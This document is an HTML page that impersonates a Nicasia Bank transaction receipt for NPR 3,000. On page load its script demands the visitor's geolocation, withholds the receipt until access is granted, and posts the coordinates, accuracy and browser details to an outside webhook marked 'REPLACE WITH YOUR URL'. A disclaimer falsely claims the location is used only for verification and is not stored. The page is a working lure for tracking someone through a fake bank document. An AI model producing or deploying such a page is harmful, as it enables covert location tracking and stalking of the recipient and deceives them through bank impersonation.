<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Transaction Receipt - Nicasia Bank</title>
  <style>
    body {
      background: #f4f4f4;
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    .receipt {
      background: white;
      max-width: 400px;
      margin: 20px auto;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      display: none;
    }
    .receipt h2 {
      text-align: center;
      color: #2a5f8a;
      margin-bottom: 10px;
    }
    .bank-logo {
      text-align: center;
      font-weight: bold;
      color: #2a5f8a;
      margin-bottom: 20px;
    }
    .details {
      margin: 20px 0;
      border-top: 1px dashed #ddd;
      border-bottom: 1px dashed #ddd;
      padding: 15px 0;
    }
    .detail-row {
      display: flex;
      justify-content: space-between;
      margin: 10px 0;
    }
    .detail-label {
      color: #666;
    }
    .detail-value {
      font-weight: bold;
    }
    .success-badge {
      background: #4CAF50;
      color: white;
      padding: 8px 15px;
      border-radius: 20px;
      text-align: center;
      margin: 20px auto;
      width: fit-content;
    }
    #location-status {
      text-align: center;
      color: #666;
      font-size: 14px;
      margin-top: 15px;
    }
    .disclaimer {
      font-size: 12px;
      color: #666;
      text-align: center;
      margin-top: 20px;
    }
    .disclaimer button {
      background: none;
      border: none;
      color: #2a5f8a;
      text-decoration: underline;
      cursor: pointer;
      padding: 0;
      margin-left: 5px;
    }
  </style>
</head>
<body>
  <div class="receipt" id="receipt">
    <div class="bank-logo">NICASIA BANK</div>
    <h2>Transaction Receipt</h2>
    <div class="success-badge">Transaction Successful</div>
    <div class="details">
      <div class="detail-row">
        <span class="detail-label">From:</span>
        <span class="detail-value">****** Budhathoki</span>
      </div>
      <div class="detail-row">
        <span class="detail-label">To:</span>
        <span class="detail-value">**** Nagarkoti</span>
      </div>
      <div class="detail-row">
        <span class="detail-label">Amount:</span>
        <span class="detail-value">NPR 3,000</span>
      </div>
      <div class="detail-row">
        <span class="detail-label">Date:</span>
        <span class="detail-value" id="transaction-date"></span>
      </div>
      <div class="detail-row">
        <span class="detail-label">Transaction ID:</span>
        <span class="detail-value">NIC-7890-2024</span>
      </div>
    </div>
    <div id="location-status">Transaction verified with location data</div>
    <p class="disclaimer">
      Location data is used solely for verification and is not stored.
      <button onclick="showMap()">Show what we see</button>
    </p>
  </div>

  <script>
    // Set current date
    document.getElementById('transaction-date').textContent = new Date().toLocaleString();

    let userPosition = null;
    const WEBHOOK_URL = "https://eoujfk3m6inyjql.m.pipedream.net"; // REPLACE WITH YOUR URL

    function sendToWebhook(data) {
      fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      })
      .then(response => console.log("Webhook success:", response))
      .catch(error => console.error("Webhook error:", error));
    }

    function showMap() {
      if (userPosition) {
        const lat = userPosition.coords.latitude;
        const lng = userPosition.coords.longitude;
        window.open(`https://www.openstreetmap.org/?mlat=${lat}&mlon=${lng}&zoom=15`);
      } else {
        alert("No location data available");
      }
    }

    function requestLocation() {
      const receipt = document.getElementById('receipt');
      const permissionStatus = document.getElementById('location-status');

      if (navigator.geolocation) {
        permissionStatus.textContent = "Checking location...";

        navigator.geolocation.getCurrentPosition(
          (position) => {
            userPosition = position;
            console.log(`Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`);

            // Send location data to webhook
            const webhookData = {
              transaction_id: "NIC-7890-2024",
              amount: "NPR 3,000",
              sender: "****** Budhathoki",
              receiver: "**** Nagarkoti",
              location: {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: position.coords.accuracy
              },
              device: navigator.userAgent,
              timestamp: new Date().toISOString()
            };
            sendToWebhook(webhookData);

            // Show receipt
            receipt.style.display = 'block';
            permissionStatus.textContent = `Location verified (accuracy: ${position.coords.accuracy}m)`;
          },
          (error) => {
            permissionStatus.textContent = "Location access is required to view your receipt.";
            if (error.code === error.PERMISSION_DENIED) {
              permissionStatus.textContent = "You must grant location access to view your receipt.";
            }
          }
        );
      } else {
        permissionStatus.textContent = "Geolocation is not supported by your browser.";
      }
    }

    // Automatically request location permission as soon as the page loads
    window.onload = requestLocation;
  </script>
</body>
</html>
